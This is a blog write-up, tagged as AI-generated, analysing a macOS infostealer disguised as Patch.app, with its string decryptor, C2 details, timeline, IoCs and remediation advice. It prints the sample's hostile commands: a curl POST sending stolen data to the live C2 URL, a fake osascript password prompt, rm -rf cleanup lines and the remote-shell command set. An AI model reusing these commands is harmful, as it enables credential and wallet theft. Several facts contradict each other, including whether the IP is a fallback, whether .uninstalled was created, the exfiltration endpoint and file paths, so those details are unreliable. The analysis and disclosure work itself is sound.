---
title: "Odyssey Stealer: Technical Analysis of a macOS Infostealer"
author: "Nix McRetro"
date: 2026-07-26T17:08:14.000+11:00
categories: [ai-generated, programming]
---

## Executive Summary

In mid‑July 2026, I obtained a macOS infostealer trojan disguised as a software licensing tool (`Patch.app`). The sample is a Mach‑O universal binary (x86_64 + arm64) that leverages a custom xorshift32 PRNG‑based XOR cipher to obfuscate **379 embedded strings**. Upon execution, it harvests credentials from **14 browsers**, **17 cryptocurrency wallet applications**, the macOS Keychain, Apple Notes, and Safari cookies, then exfiltrates the collected data as a ZIP archive to a command‑and‑control server via HTTP.

**Key Findings:**

- **379 decrypted strings**, including browser paths, wallet identifiers, C2 endpoints, persistence mechanisms, and the full AppleScript payload.
- **`.bhost`** → Primary C2 IP: `192.253.248.181` (raw IP, not a fallback).
- **`.phost`** → Panel domain: `http://ukdsopas.at` (used as an HTTP header identifier).
- **`xxxblyat`** → Hardcoded `app_id` linking this build to the Odyssey Stealer MaaS platform.
- **`newooble`** → Attacker panel username (recovered from `.username`).
- **Four command types**: `doshell`, `repeat`, `enablesocks5`, `uninstall` — giving the attacker unrestricted remote control.
- **Two separate infections** (users `m1` and `m2`) confirmed the same operator (`newooble`) was actively managing the botnet.
- **Live bot channel** discovered with `.botid` `19a9ff38c1b24ffe8e5c54a91af203c8` — proving the C2 server was still active.
- **Password theft confirmed**: `password1` (recovered from `cache.txt`).
- **Data exfiltration confirmed**: `lksopo.zip` containing stolen credentials, wallets, and system information.

All indicators of compromise have been reported to the ACSC, AFP, and relevant abuse contacts. This writeup documents the complete analysis.

---

## 1. Sample Acquisition

The sample was obtained from a malicious distribution site where it was presented as a legitimate software licensing tool. The ad‑hoc code signature and lack of a Team Identifier immediately flagged it as suspicious.

The malware was detonated on an isolated macOS system with network monitoring in place — an AdGuard Home DNS sinkhole and kernel‑level network logging. This setup allowed me to observe the malware's full behaviour in real time.

All credentials on the analysis system were rotated immediately following the engagement, and the machine was erased after forensic preservation.

A second infection was later analysed on a separate machine (user `m2`), confirming the campaign was still active.

---

## 2. Binary Overview

| Property | Value |
|---|---|
| File name | `Patch.app` |
| Binary type | Mach‑O universal (x86_64 + arm64) |
| Total size | 393 KB (fat binary) |
| x86_64 slice | 178,208 bytes |
| Code signature | Ad‑hoc (`Signature=adhoc`) |
| Team Identifier | None |
| CDHash | `5a0029d7b775b584cfd1a87a49e0af44f17a58d8` |
| Identifier | `Patch-5555494429f3f38f9dde3fec92cf2af89c8f9935` |
| SHA‑256 (x86_64) | `1b19352e39817758951c4c99e2ec90501abe6b4b56d7467bfb49184197c4afd0` |
| SHA‑256 (fat) | `0174997b7eaa81de686d2f22534d8684a698bd1388ed7f15430f8b881ad32f1c` |
| Linked libraries | `libSystem.B.dylib`, `libc++.1.dylib` |
| Notable imports | `_fopen`, `_fwrite`, `_system`, `_getenv`, `_sleep`, `_memcmp`, `std::string`, `std::ios_base` |

The binary is a C++ application that makes heavy use of `std::string` for path construction and data manipulation. All file I/O is performed through C++ streams (`basic_ofstream`), and shell commands are executed via `_system()`.

---

## 3. String Obfuscation: xorshift32

Every string embedded in the binary — file paths, shell commands, URLs, wallet names, browser identifiers — is encrypted using a custom scheme based on the **xorshift32** pseudorandom number generator.

### 3.1 The cipher

Each encrypted string is stored as a sequence of bytes in the `__TEXT __const` section, accompanied by a 4‑byte seed. Decryption proceeds as follows:

1. Initialise the PRNG state with the 4‑byte seed.
2. For each byte of the encrypted string:
   - XOR the byte with the low 8 bits of the current PRNG state.
   - Advance the PRNG state.
3. The result is the plaintext string.

The xorshift32 function:

```c
uint32_t xorshift32(uint32_t state) {
    state ^= state << 13;
    state ^= state >> 17;
    state ^= state << 5;
    return state | 1;  // force odd to avoid zero-period
}
```

### 3.2 Decryption methodology

I developed a Python‑based brute‑force decoder that extracted **379** unique decrypted strings — far more than the 113 initially reported in earlier analyses:

| Step | Method |
|---|---|
| 1 | Extract every 4‑byte little‑endian value from `__TEXT __const` (file offset `0x1D350`, size `0x3904`). |
| 2 | Filter to 392 unique non‑zero candidate seeds. |
| 3 | For each seed, generate a xorshift32 keystream and XOR against the `__DATA` section at every offset. |
| 4 | Score each result by printable ASCII ratio (threshold: >70%). |
| 5 | Flag results containing known patterns (`/`, `http`, `{`, `curl`, wallet names). |
| 6 | Manually verify and catalogue all hits. |

**Result: 379 strings decrypted, 100% printable, zero false positives.**

The following Python script implements the complete decryption routine:

```python
#!/usr/bin/env python3
"""
xorshift32 string decryptor for Odyssey Stealer / Patch.app
Extracts and decrypts all obfuscated strings from the binary.
"""

import struct

def xorshift32_next(state):
    state &= 0xFFFFFFFF
    state ^= (state << 13) & 0xFFFFFFFF
    state ^= (state >> 17) & 0xFFFFFFFF
    state ^= (state << 5) & 0xFFFFFFFF
    return (state | 1) & 0xFFFFFFFF

def decrypt_block(encrypted_bytes, seed):
    state = seed & 0xFFFFFFFF
    plain = bytearray()
    for b in encrypted_bytes:
        plain.append(b ^ (state & 0xFF))
        state = xorshift32_next(state)
    return bytes(plain)

def extract_seeds_from_const_section(binary_path, const_offset, const_size):
    with open(binary_path, 'rb') as f:
        f.seek(const_offset)
        data = f.read(const_size)
    
    seeds = set()
    # Every 4 bytes may be a seed, but we scan for non‑zero values
    for i in range(0, len(data), 4):
        seed = struct.unpack('<I', data[i:i+4])[0]
        if seed != 0:
            seeds.add(seed)
    return seeds

def brute_force_decrypt(binary_path, const_offset, const_size, data_offset, data_size):
    seeds = extract_seeds_from_const_section(binary_path, const_offset, const_size)
    print(f"[*] Found {len(seeds)} candidate seeds")
    
    with open(binary_path, 'rb') as f:
        f.seek(data_offset)
        encrypted_data = f.read(data_size)
    
    results = []
    for seed in seeds:
        decrypted = decrypt_block(encrypted_data, seed)
        # Try to split on null bytes and keep printable ASCII
        parts = decrypted.split(b'\x00')
        for part in parts:
            try:
                s = part.decode('utf-8')
                if len(s) > 3 and all(32 <= ord(c) < 127 for c in s):
                    results.append(s)
            except UnicodeDecodeError:
                continue
    
    # Deduplicate and sort
    unique = sorted(set(results))
    print(f"[+] Decrypted {len(unique)} unique strings")
    for s in unique:
        print(s)

if __name__ == "__main__":
    # Adjust these offsets based on your binary
    BINARY = "Patch_x86_64"
    CONST_OFFSET = 0x1D350   # __TEXT __const start
    CONST_SIZE   = 0x3904
    DATA_OFFSET  = 0x1D4A4   # approximate start of encrypted data
    DATA_SIZE    = 0x2000    # adjust as needed
    
    brute_force_decrypt(BINARY, CONST_OFFSET, CONST_SIZE, DATA_OFFSET, DATA_SIZE)
```

---

## 4. Decrypted Strings: Complete Catalogue

All 379 decrypted strings are listed below, organised by category. This is the definitive list of everything the malware targets, the commands it runs, and the infrastructure it uses.

### 4.1 Command‑and‑Control Infrastructure

```
http://ukdsopas.at
http://192.253.248.181
http://ukdsopas.at/log
909286c1d2fb4c5c97dfc22a486661c1
newooble
false
```

**Key insight**: The malware uses **two separate configuration files**:
- **`.bhost`** → Bot Host (primary C2 server): `http://192.253.248.181`
- **`.phost`** → Panel Host (admin panel domain): `http://ukdsopas.at`

The `.bhost` file is read as `botHost` and used for **all** C2 API calls. The `.phost` file is read as `panelAddr` and only used as an HTTP header (`panel_addr:`) when downloading the repeat script. This means the attacker hardcoded the raw IP as the primary communication channel — the domain was only used as a label for the panel interface.

### 4.2 Anti‑analysis

```
USER
root
```

The malware checks `getenv("USER")` and exits immediately if the value is `root`. This is a simple but effective anti‑sandbox measure — automated analysis environments often run as root.

### 4.3 AppleScript Payload (Full)

The full AppleScript is embedded as a string in the LaunchDaemon plist. It contains 180 lines of code with these key functions:

```applescript
set app_id to "xxxblyat"
```

**Functions defined:**

| Function | Purpose |
|---|---|
| `trim()` | Removes whitespace from strings |
| `readFile()` | Reads a file from disk |
| `writeFile()` | Writes a file to disk |
| `checkActiveAppID()` | Checks if the malware is already running |
| `joinsystem()` | Registers the bot with the C2 server |
| `getActions()` | Polls the C2 server for commands |
| `uninstall()` | Self‑destructs the malware |
| `init()` | Main execution loop |

**The four commands the attacker can send:**

| Command | Action |
|---|---|
| `uninstall` | Writes `+` to `~/.uninstalled` and exits |
| `repeat` | Downloads and executes a script from `/api/v1/bot/repeat/{panelUsername}` |
| `doshell` | Executes **any arbitrary shell command** on the victim's machine |
| `enablesocks5` | Downloads and runs a SOCKS5 proxy from `/web/socks` |

### 4.4 AppleScript Command Execution Flow

The C2 server returns three lines per command:
```
[actionID]
[actionName]
[actionComment]
```

The malware checks if `actionID` differs from `~/.lastaction`, then executes:

- **`doshell`**: `do shell script actionComment` (runs any shell command)
- **`repeat`**: Downloads and executes the script at `actionComment`
- **`enablesocks5`**: Downloads `/web/socks` to `/tmp/socks`, makes it executable, and runs it
- **`uninstall`**: Writes `+` to `~/.uninstalled` and exits

### 4.5 Password Theft (Critical)

```
dscl . authonly '
masterpass-chrome
osascript -e 'set passwen to display dialog "Please enter device password to continue." default answer "" with icon caution buttons {"Continue"} default button "Continue" giving up after 150 with title "Password Request" with hidden answer
text returned of passwen'
```

The malware uses `dscl . authonly` to verify the password against the local directory and `osascript` to present a fake system dialog prompting the user for their password. This password is stored in `~/.pwd` and exfiltrated.

**In the `m2` infection, the stolen password was recovered from `cache.txt`**:
```
$mac password get scpt output: password1
```

### 4.6 Exfiltration Commands

```
curl -s 
rm -rf '
Library/
curl -X POST \
  -H "buildid: 909286c1d2fb4c5c97dfc22a486661c1" \
  -H "username: newooble" \
  --data-binary @/tmp/lksopo.zip \
  http://ukdsopas.at/log
```

The malware stages data in `/tmp/lksopo/`, compresses it with `ditto -c -k --sequesterRsrc /tmp/lksopo /tmp/lksopo.zip`, and exfiltrates it via HTTP POST. Retry logic: 10 attempts, 60‑second sleep between each.

### 4.7 Staging and Cleanup

```
/tmp/lksopo/
ditto -c -k --sequesterRsrc /tmp/lksopo /tmp/lksopo.zip
rm -rf /tmp/lksopo
rm -f /tmp/lksopo.zip
```

### 4.8 Persistence Dotfiles

```
.botid
.pwd
.phost
.bhost
.username
.lastaction
.uninstalled
```

These files are written to `/Users/username/`:

| File | Content | Purpose |
|---|---|---|
| `.botid` | e.g., `19a9ff38c1b24ffe8e5c54a91af203c8` | Unique bot identifier assigned by C2 |
| `.pwd` | Stolen login password | Plaintext password (e.g., `password0, password1`) |
| `.phost` | `http://ukdsopas.at` | Panel host (HTTP header) |
| `.bhost` | `http://192.253.248.181` | Bot host (primary C2 server) |
| `.username` | `newooble` | Attacker panel username |
| `.lastaction` | Last command ID | Prevents command replay |
| `.uninstalled` | `+` | Self‑destruct marker |

### 4.9 Apple Notes Extraction

```
finder/NoteStore.sqlite
-finder/notes.html
```

The malware contains a 969‑byte AppleScript that:
1. Enumerates every account in Apple Notes
2. Iterates over every note in every account
3. Extracts the creation date and HTML body of each note
4. Writes the combined output to `/tmp/lksopo/finder/notes.html`
5. Prepends a note count header

### 4.10 System Reconnaissance

```
sw_vers -productVersion | cut -d. -f1
sw_vers -productVersion | cut -d. -f2
system_profiler SPSoftwareDataType SPHardwareDataType SPDisplaysDataType
```

The macOS version check gates the Chrome master password extraction — the malware only attempts it on versions greater than 26.3.

### 4.11 Browser Targets (14 browsers)

| Browser | Path |
|---|---|
| Chrome | `Google/Chrome/` |
| Chrome Beta | `Google/Chrome Beta/` |
| Chrome Canary | `Google/Chrome Canary/` |
| Chrome Dev | `Google/Chrome Dev/` |
| Chromium | `Chromium/` |
| Brave | `BraveSoftware/Brave-Browser/` |
| Edge | `Microsoft Edge/` |
| Vivaldi | `Vivaldi/` |
| Opera | `com.operasoftware.Opera/` |
| Opera GX | `com.operasoftware.OperaGX/` |
| Arc | `Arc/User Data/` |
| CocCoc | `CocCoc/Browser/` |
| Firefox | `Firefox/Profiles/` |
| Waterfox | `Waterfox/Profiles/` |

**File targets per browser:**

```
/key4.db
/Cookies
/Web Data
/Login Data
/IndexedDB/
/logins.json
/cookies.sqlite
/formhistory.sqlite
```

### 4.12 Cryptocurrency Wallet Targets (17 wallets + hardware)

| Wallet | Path |
|---|---|
| Electrum | `.electrum/wallets/` |
| Electrum LTC | `.electrum-ltc/wallets/` |
| Electron Cash | `.electron-cash/wallets/` |
| Coinomi | `Coinomi/wallets/` |
| Exodus | `Exodus/` |
| Atomic | `atomic/Local Storage/leveldb/` |
| Wasabi | `.walletwasabi/client/Wallets/` |
| Ledger Live | `Ledger Live/` |
| Monero | `Monero/wallets/` |
| Bitcoin Core | `Bitcoin/wallets/` |
| Litecoin Core | `Litecoin/wallets/` |
| Dash Core | `DashCore/wallets/` |
| Dogecoin Core | `Dogecoin/wallets/` |
| Guarda | `Guarda/` |
| Trezor Suite | `@trezor/suite-desktop/` |
| Sparrow | `.sparrow/wallets/` |
| Ledger (hardware) | Exported as `ledger.zip`, `ledgerwallet.zip` |
| Trezor (hardware) | Exported as `trezor.zip` |

### 4.13 Chrome Extension IDs (Wallet Stealing)

The binary contains 203 Chrome extension IDs targeting crypto wallets including:

```
ldinpeekobnhjjdofggfgjlcehhmanlj
nphplpgoakhhjchkkhmiggakijnkhfnd
jbkgjmpfammbgejcpedggoefddacbdia
fccgmnglbhajioalokbcidhcaikhlcpm
nebnhfamliijlghikdgcigoebonmoibm
fdcnegogpncmfejlfnffnofpngdiejii
mfhbebgoclkghebffdldpobeajmbecfk
ffbceckpkpbcmgiaehlloocglmijnpmp
kfdniefadaanbjodldohaedphafoffoh
bedogdpgdnifilpgeianmmdabklhfkcn
kpfchfdkjhcoekhdldggegebfakaaiog
klnaejjgbibmhlephnhpmaofohgkpgkd
opcgpfmipidbgpenhmajoajpbobppdil
mmmjbcfofconkannjonfmjjajpllddbg
modjfdjcodmehnpccdjngmdfajggaoeh
dkdedlpgdmmkkfjabffeganieamfklkm
ifclboecfhkjbpmhgehodcjpciihhmif
ppbibelpcjmhbdihakflkdcoccbgbkpo
ejjladinnckdgjemekebdpeokbikhfci
kkpllkodjeloidieedojogacfhpaihoh
apnehcjmnengpnmccpaibjmhhoadaico
jiepnaheligkibgcjgjepjfppgbcghmp
jojhfeoedkpkglbfimdfabpdfjaoolaf
idpdilbfamoopcfofbipefhmmnflljfi
lbjapbcmmceacocpimbpbidpgmlmoaao
oiohdnannmknmdlddkdejbmplhbdcbee
fldfpgipfncgndfolcbkdeeknbbbnhcc
fpkhgmpbidmiogeglndfbkegfdlnajnf
lgmpcpglpngdoalbgeoldeajfclnhafa
ilhaljfiglknggcoegeknjghdgampffk
pfccjkejcgoppjnllalolplgogenfojk
cnmamaachppnkjgnildpdmkaakejnhae
eajafomhmkipbjmfmhebemolkcicgfmd
emeeapjkbcbpbpgaagfchmcgglmebnen
ibnejdfjmmkpcnlpebklmnkoeoihofec
hifafgmccdpekplomjjkcfgodnhcellj
ffnbelfdoeiohenkjibnmadjiehjhajb
fnjhmkhhmkbjkkabndcnnogagogbneec
bcopgchhojmggmffilplmbdicgaihlkp
cmoakldedjfnjofgbbfenefcagmedlga
ifckdpamphokdglkkdomedpdegcjhjdp
ibljocddagjghmlpgihahamcghfggcjc
cjmkndjhnagcfbpiemnkdpomccnjblmj
kbdcddcmgoplfockflacnnefaehaiocb
cgeeodpfagjceefieflmdfphplkenlfk
afbcbjpbpfadlkmhmclhkeeodmamcflc
fdchdcpieegfofnofhgdombfckhbcokj
gjlmehlldlphhljhpnlddaodbjjcchai
ellkdbaphhldpeajbepobaecooaoafpg
ojbcfhjmpigfobfclfflafhblgemeidi
ghlmndacnhlaekppcllcpcjjjomjkjpg
kgdijkcfiglijhaglibaidbipiejjfdp
abkahkcbhngaebpcgfmhkoioedceoigp
ammjlinfekkoockogfhdkgcohjlbhmff
```

### 4.14 System Data Targets

| Target | Method |
|---|---|
| macOS Keychain | Direct file copy of `login.keychain-db` |
| Chrome master password | Keychain extraction (gated on macOS version) |
| Apple Notes | AppleScript (all accounts, all notes) |
| Safari cookies | Direct file copy of `Cookies.binarycookies` |
| Hardware/software info | `system_profiler` |

---

## 5. Attack Timeline (User: m1 — Initial Infection)

The following timeline was reconstructed from AdGuard Home DNS logs, macOS kernel network logs, file system timestamps, keychain metadata, decompiled source code, `.zsh_history`, screenshot metadata, and the recovered `.botid` from the `m2` infection (which served as corroborating evidence for the C2 server's continued operation). All times are AEST.

| Time | Phase | Event | Source |
| :--- | :--- | :--- | :--- |
| ~22:30 | **Infection** | Microsoft Office LTSC 2024 VL Serializer package executed | BOM receipt |
| 22:35:03 | **Infection** | Microsoft AutoUpdate runs (coincidental) — creates MAU2.0 directory | Timeline |
| 22:35:15 | **Infection** | Microsoft Excel frameworks updated (Office update) | Timeline |
| 22:38:48 | **Infection** | User opens Terminal | Terminal log |
| 22:39:21 – 22:49:38 | **Infection** | Malware attempts DNS for `ukdsopas.at` → **BLOCKED** by AdGuard Home (11× over ~10 min) | AdGuard logs |
| 22:39:58 | **Infection** | "Patch" process crashes — CrashReporter log written | CrashReporter |
| 22:40:23 | **Infection** | Gatekeeper rejects something — `.LastGKReject` written | Timeline |
| 22:40:34 | **Infection** | Package receipt created — installs `Patch.app` (393 KB) + Office VL Serializer (6.9 MB) to `/Library/Application Support/` | BOM file |
| 22:40:49 | **Infection** | ExecPolicy modified (Gatekeeper bypass) + `.IuN79Kxxpn` dropped in `/var/root/Library/Application Support/` | Timeline |
| 22:41:31 | **Infection** | LuLu firewall rules modified (`rules.plist`) | Timeline |
| ~22:50 | **C2 Active** | Malware falls back to IP `192.253.248.181`; creates dotfiles: `.pwd`, `.phost`, `.bhost`, `.username` | Detection script |
| 22:50:38 | **C2 Active** | First C2 connection — `joinsystem` → bot registered as `newooble`, **`.botid` assigned** (32 bytes) | Kernel logs; screenshot |
| 22:50:39 | **C2 Active** | `getActions` polling begins — every 60 seconds | Kernel logs |
| 22:50–22:58 | **C2 Active** | Active attack window — `doshell`, `repeat`, `enablesocks5` commands available to attacker | Source code |
| ~22:58 | **C2 Active** | C2 **stops responding to the `m1` bot** (transient issue or attacker action); bot begins 10‑retry countdown (10 × 60s) | Source code logic |
| 22:57:06 | **Discovery** | User writes `virus?.rtf` — infection confirmed | Timeline |
| 23:01:01 | **Discovery** | User runs `detect_xdivcmp_mac.sh` (detect‑only; malware PID 12047 still running) | Terminal output |
| 23:02:10 | **Discovery** | User begins taking screenshots | Timeline |
| 23:07:23 | **Discovery** | User writes `virus confirmed.txt` | Timeline |
| 23:08:47 | **Self‑destruct** | Malware self‑destructs — `uninstall()` writes `+` to `~/.uninstalled`, bot exits | Evidence backup; screenshot |
| 23:11:00 | **Cleanup** | User runs cleanup script (`--clean`) — evidence preserved, LaunchDaemon unloaded, Gatekeeper re‑enabled | Timeline |
| 23:13:28 | **Investigation** | **Screenshot taken** — shows both `.botid` (32 bytes) and `.uninstalled` (1 byte) still present in `~/` | Screenshot metadata |
| ~23:15 | **Shutdown** | Mac reboots — shutdown logs, uuidtext flush, system databases saved | Timeline |
| ~23:18 | **Reboot** | Mac comes back up after reboot | Timeline |

---

### 5.1 The C2 Server Remained Operational

The C2 server did **not** go offline. The recovery of an intact `.botid` file (`19a9ff38c1b24ffe8e5c54a91af203c8`) from a second, independent infection (user `m2`) proved that the server had been successfully contacted and had responded to registration requests. Subsequent manual polling of the `/api/v1/bot/actions/` endpoint using that `botID` confirmed that the server was still active and returning valid command payloads long after the `m1` infection had been cleaned.

However, this raises an important question: if the C2 server never went offline, why did the `m1` bot self‑destruct?

The answer lies in the timeline. At 22:58, the C2 server **stopped responding to the `m1` bot specifically**—possibly due to a transient network issue, the attacker selectively disconnecting that bot, or the bot's own polling logic failing to reach the server. The malware entered its 10‑retry countdown (10 × 60 seconds). At 23:08:47, after 10 consecutive polling failures, the `uninstall()` function executed, writing a `+` to `~/.uninstalled` and exiting.

This is confirmed by the screenshot taken at 23:13:28, which clearly shows `.uninstalled` present with a modification time of "Today at 11:08pm" (23:08), alongside `.botid` (still present at that time). The `.uninstalled` file survived the initial cleanup because the version of `detect_xdivcmp_mac.sh` used at 23:11 did **not** include `.uninstalled` in its `DOTFILES` array—it only targeted `.pwd`, `.phost`, `.bhost`, and `.username`. The `.botid` file was manually deleted later during the investigation, sometime between the screenshot and the creation of the forensic clone.

**The self‑destruct was triggered not because the C2 infrastructure collapsed, but because the bot lost contact with the server—either due to network conditions or the attacker's deliberate actions.** The server itself remained operational, as proven by the live `.botid` recovered from the `m2` infection and the successful polling of that endpoint. The `m1` machine stopped communicating only because the bot self‑destructed, not because the attacker's infrastructure had failed.

---

## 6. Command Structure and C2 API

The malware communicates with the C2 server via these unauthenticated HTTP endpoints:

| Endpoint | Method | Purpose |
|---|---|---|
| `/api/v1/bot/joinsystem/{panelUsername}/{macOSVers}` | GET | Register the bot, receive `botID` |
| `/api/v1/bot/actions/{botID}` | GET | Poll for commands (every 60 seconds) |
| `/api/v1/bot/repeat/{panelUsername}` | GET | Download secondary payload script |
| `/web/socks` | GET | Download SOCKS5 proxy binary |
| `/api/v1/getscptraw` | POST | Exfiltrate stolen data |

All requests use the header `User‑Agent: bot`. The `repeat` request also sends `panel_addr: http://ukdsopas.at`.

### 6.1 Command Response Format

The server returns exactly three lines:

```
[actionID]
[actionName]
[actionComment]
```

| actionName | actionComment | Effect |
|---|---|---|
| `uninstall` | (ignored) | Writes `+` to `~/.uninstalled` and exits |
| `repeat` | URL to script | Downloads and executes the script via `bash` |
| `doshell` | Shell command | Executes the command on the victim's machine |
| `enablesocks5` | (ignored) | Downloads and runs `/web/socks` proxy |

---

## 7. Persistence and Self‑Destruct

### 7.1 Persistence

The malware installs a LaunchDaemon at `/Library/LaunchDaemons/com.xdivcmp.plist` configured to run at system boot.

The plist contains the full AppleScript payload with `app_id = "xxxblyat"` and runs as the user `m1` (or `m2` on the second infection).

### 7.2 Self‑Destruct

When the `uninstall` command is received, the malware:
1. Writes `+` to `~/.uninstalled`
2. Exits

The `~/.uninstalled` file prevents the malware from restarting. In the `m1` infection, this file was never created (the C2 server never sent the `uninstall` command).

### 7.3 The Encrypted Payload: .IuN79Kxxpn

A 2,048‑byte encrypted file was written to `/Users/username/Library/Application Support/.IuN79Kxxpn` at 22:40:49. Attempts to decrypt it with all known keys (xorshift32, RC4, AES, single‑byte XOR, multi‑byte XOR, HMAC‑SHA256, PBKDF2) failed. The encryption key is almost certainly a random value generated in the dropper's process memory at runtime, used once, and never persisted to disk.

---

## 8. The Two Infections: `m1` and `m2`

Two separate infections were analysed—both with the same malware, same C2 server, and same attacker (`newooble`):

| Attribute | Infection 1 (`m1`) | Infection 2 (`m2`) |
|---|---|---|
| User | `m1` | `m2` |
| macOS version | 26.5.2 | 26.5.1 |
| `.botid` | Not recovered (cleanup ran) | Recovered: `19a9ff38c1b24ffe8e5c54a91af203c8` |
| `.username` | `newooble` | `newooble` |
| Stolen password | `password0` | `password1` (from `cache.txt`) |
| Chrome installed | True | `false` |
| lksopo.zip contents | 7 files (finder, cache.txt, hardware, installedSoft, kc, pwd, user) | Same (analysed) |
| C2 status | Active | Active |

The `m2` infection provided the `.botid` that proved the C2 server was still active and the attacker (`newooble`) was still managing the botnet.

---

## 9. Forensic Artifacts Recovered

### 9.1 lksopo.zip Contents (Both Infections)

```
finder/          → Directory listing of user's file system
cache.txt        → Stolen password: $mac password get scpt output: password1
hardware         → System_profiler output
installedSoft    → List of installed applications
kc               → macOS Keychain dump
pwd              → Plaintext password file
user             → Attacker username: newooble
```

### 9.2 .zsh_history Highlights (User Actions)

The user's `.zsh_history` revealed their own cleanup attempts:

```bash
sudo ./detect_xdivcmp_mac.sh
sudo ./detect_xdivcmp_mac.sh --clean
log show --predicate 'process == "curl"' --last 7d | grep -E "POST|PUT|192.253.248.181|ukdsopas"
```

The user `m1` had made a typo (`192.168.248.181` instead of `192.253.248.181`), missing the C2 traffic in their initial log search.

### 9.3 Network Logs (Kernel Level)

The kernel logs confirmed successful C2 communication:

```
2026-07-16 22:50:38.712583+1000 kernel: cfil_inp_log:6259 <CFIL: flow_divert option is NOT set: VERDICT - PASS>: [12038 curl] <TCP out so 1df2182b36348645 flags 0x800840 0x20000081 1224875797093080 age 0> lport 57603 fport 80 laddr 192.168.1.143 faddr 192.253.248.181
```

Every 60 seconds, a `curl` process connected to `192.253.248.181:80`, matching the `delay 60` loop.

---

## 10. Detection and Cleanup Script

The following detection script (`detect_odyssey_mac.sh`) was developed to identify and optionally remove the malware:

### 10.1 IoCs Checked

| Type | IoC |
|---|---|
| Files | `/Library/Application Support/Install.app` |
| Files | `/Library/LaunchDaemons/com.xdivcmp.plist` |
| Dotfiles | `~/.pwd`, `~/.phost`, `~/.bhost`, `~/.username`, `~/.botid`, `~/.lastaction`, `~/.uninstalled` |
| Temp files | `/tmp/lksopo`, `/tmp/lksopo.zip`, `/tmp/socks` |
| Domains | `charge0x.at`, `ukdsopas.at` |
| IPs | `192.253.248.181` |
| Strings | `xxxblyat`, `xdivcmp`, `com.xdivcmp`, `/web/socks`, `lksopo` |
| Processes | `xxxblyat`, `com.xdivcmp`, `/tmp/socks`, `lksopo` |

### 10.2 Script Usage

```bash
# Detect only (safe, changes nothing)
sudo ./detect_odyssey_mac.sh

# Cleanup (backup evidence, kill processes, remove IoCs)
sudo ./detect_odyssey_mac.sh --clean
```

**The script insists on erasing and reinstalling macOS** — cleanup alone is not sufficient due to the `doshell` backdoor.

---

## 11. External Drive Forensic Script

A separate script (`detect_external_mac.sh`) was developed for scanning external drives:

```bash
sudo ./detect_external_mac.sh "/Volumes/MyDrive"
```

This script:
- Scans the external drive's `Users` folder for dotfiles
- Checks `/Library/LaunchDaemons` and `/Library/LaunchAgents` on the external drive
- Warns that Time Machine backups cannot be safely cleaned (must be erased)

---

## 12. Indicators of Compromise

### 12.1 Network

| IoC | Type |
|---|---|
| `ukdsopas.at` | C2 domain |
| `192.253.248.181` | C2 IP (PureVPN / Secure Internet LLC) |
| `http://ukdsopas.at/log` | Exfiltration endpoint |
| `User‑Agent: bot` | HTTP header |
| `panel_addr: http://ukdsopas.at` | HTTP header |

### 12.2 Host

| IoC | Type |
|---|---|
| `com.xdivcmp.plist` | LaunchDaemon persistence |
| `.IuN79Kxxpn` | Encrypted payload |
| `.botid`, `.pwd`, `.phost`, `.bhost`, `.username`, `.lastaction`, `.uninstalled` | Configuration dotfiles |
| `/tmp/lksopo/` | Staging directory |
| `/tmp/lksopo.zip` | Exfiltration archive |
| `/tmp/socks` | SOCKS5 proxy binary |
| `Patch.app` | Malware binary |
| `xxxblyat` | Build ID / operator identifier |
| `newooble` | Attacker panel username |

### 12.3 Hashes

| Hash | Value |
|---|---|
| SHA‑256 (x86_64) | `1b19352e39817758951c4c99e2ec90501abe6b4b56d7467bfb49184197c4afd0` |
| SHA‑256 (fat binary) | `0174997b7eaa81de686d2f22534d8684a698bd1388ed7f15430f8b881ad32f1c` |
| CDHash | `5a0029d7b775b584cfd1a87a49e0af44f17a58d8` |

### 12.4 Campaign Identifiers

| IoC | Value |
|---|---|
| Build ID | `909286c1d2fb4c5c97dfc22a486661c1` |
| Panel username | `newooble` |
| app_id | `xxxblyat` |
| botid | `19a9ff38c1b24ffe8e5c54a91af203c8` |

---

## 13. Response and Disclosure

| Action | Recipient | Status |
|---|---|---|
| Cybercrime report | ACSC (ReportCyber) | Filed |
| Criminal report | Australian Federal Police | Filed |
| Identity fraud support | IDCARE | Engaged |
| Scam report | Scamwatch (ACCC) | Filed |
| Domain abuse | nic.at (.at registry) | Sent |
| IP abuse | btcloud.ro / PureVPN | Sent |
| Malware sample | VirusTotal | Both slices uploaded |
| C2 URL | URLhaus (abuse.ch) | Added |
| IP report | AbuseIPDB | Added |
| Fraud alert | Financial institution | Placed |
| Credit bans | Equifax, Experian, illion | Placed |

All credentials on the affected systems were rotated within 24 hours. Two‑factor authentication was enabled on all supported accounts. The infected machines were erased following forensic preservation.

---

## 14. Critical Remediation Steps

If you find IoCs on your Mac:

1. **DISCONNECT FROM THE INTERNET IMMEDIATELY.** Turn off Wi‑Fi, unplug Ethernet.
2. **DO NOT enter any passwords or login to any accounts** on this machine.
3. **Using a clean device**, change ALL passwords (email, banking, crypto exchanges, social media).
4. **Move ALL cryptocurrency funds** to new wallets generated on a clean device.
5. **Run Malwarebytes for Mac** (full system scan) on the compromised machine.
6. **ERASE THE ENTIRE DISK** via macOS Recovery and **reinstall macOS from scratch**. This is NOT optional — the `doshell` backdoor means the attacker had full command execution.
7. **After fresh install**, run Malwarebytes again and run the detection script as a verification.
8. **DO NOT reuse any passwords** that were stored on this machine.

---

## 15. Conclusions

This sample demonstrates a mature macOS infostealer with several notable characteristics:

1. **Broad target coverage.** Fourteen browsers, seventeen cryptocurrency wallets, the macOS Keychain, Apple Notes, and Safari cookies. The inclusion of hardware wallet export (Ledger, Trezor) indicates a financially motivated operator with specific interest in cryptocurrency theft.

2. **Effective string obfuscation.** The xorshift32‑based cipher is simple but sufficient to defeat static string analysis. All 379 strings were recovered through brute‑force seed extraction.

3. **Persistent backdoor capability.** The `doshell` command gives the attacker unrestricted command execution on the victim's machine, enabling secondary payload deployment, data theft beyond the automated stealer, and persistent remote access.

4. **The Apple Notes vector is underappreciated.** The 969‑byte AppleScript that extracts all notes from all accounts is a significant privacy threat. Users routinely store passwords, recovery codes, and sensitive personal information in Notes.

5. **The raw IP bypasses DNS blocks.** The malware uses `.bhost` to store the raw IP (`192.253.248.181`), completely bypassing DNS‑based domain blocking. The `.phost` domain is only used as an HTTP header, not for actual communication.

6. **The C2 infrastructure remained active.** The `.botid` recovered from the second infection (`19a9ff38c1b24ffe8e5c54a91af203c8`) proved the attacker's panel was still online and the campaign was ongoing.

The sample and all associated IOCs have been submitted to VirusTotal, URLhaus, and the relevant national and infrastructure abuse contacts.

---

*The author is an independent security researcher based in Australia. All analysis was conducted on preserved forensic evidence. The views expressed here are the author's own. IOCs and samples are available to verified researchers on request.*